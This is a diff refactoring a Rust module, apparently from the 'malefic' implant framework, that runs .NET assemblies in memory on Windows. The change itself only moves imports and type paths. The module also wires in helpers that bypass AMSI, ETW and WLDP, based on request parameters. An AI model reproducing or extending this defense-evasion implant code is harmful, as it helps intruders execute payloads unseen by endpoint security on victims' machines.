@@ -1,11 +1,7 @@
-use crate::{check_request, Module, Result, TaskResult};
-use async_trait::async_trait;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, bypass_wldp, enable_amsi, enable_etw, enable_wldp};
 use malefic_helper::win::kit::clr::exec_assemble_in_memory;
-use malefic_trait::module_impl;
-
+use crate::prelude::*;
 
 pub struct ExecuteAssembly {}
 
@@ -14,14 +10,14 @@ pub struct ExecuteAssembly {}
 impl Module for ExecuteAssembly {}
 
 #[async_trait]
-impl crate::ModuleImpl for ExecuteAssembly {
+impl malefic_proto::module::ModuleImpl for ExecuteAssembly {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let amsi_bypass = request.param.contains_key("bypass_amsi");
         let etw_bypass = request.param.contains_key("bypass_etw");
